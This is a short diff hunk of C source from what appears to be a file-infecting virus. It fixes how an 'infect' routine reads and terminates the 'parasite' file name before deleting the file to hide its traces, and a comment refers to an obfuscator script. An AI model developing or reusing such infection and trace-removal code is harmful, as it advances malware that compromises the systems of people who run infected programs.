@@ -110,7 +110,8 @@ void infect(FILE* h, FILE* p){
 
   // get file name of parasite and delete it
   sprintf(file_link, "/proc/self/fd/%d", fileno(p));
-  readlink(file_link, file_name, 0x7F);
+  ssize_t len = readlink(file_link, file_name, sizeof(file_name));
+  file_name[len] = 0x00; // using 0x00 instead of \0 due to escaping character issue in obfuscator.sh
   remove(file_name);
 }
 
